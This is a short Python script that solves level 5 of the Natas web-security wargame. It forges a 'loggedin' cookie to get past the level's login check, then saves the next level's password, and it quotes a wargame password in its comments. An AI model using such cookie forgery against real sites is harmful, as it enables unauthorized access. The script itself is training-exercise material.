#!/usr/bin/env python
from driver import *
mycook={"loggedin":"1"}


#Result we get

# <script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
# <body>
# <h1>natas5</h1>
# <div id="content">
# Access disallowed. You are not logged in</div>

# So we guess it is something about sessions and coockies.
# Fire up burb and we see a cookie name loggedin, set to 0. Turn it to on and we are in. So That gotta be it
# Sessions and cookies go together so here we go
req = makeGetConnection(cookies=mycook)
# print req





passw = retrievePassword(req)
print passw

nextLlv = int(lvl) + 1
with open( ("natas" + str(nextLlv) +".pass") , "w")as f:
	f.write(passw + "\n")
print "The password for natas" + str(nextLlv) + " is: " + passw


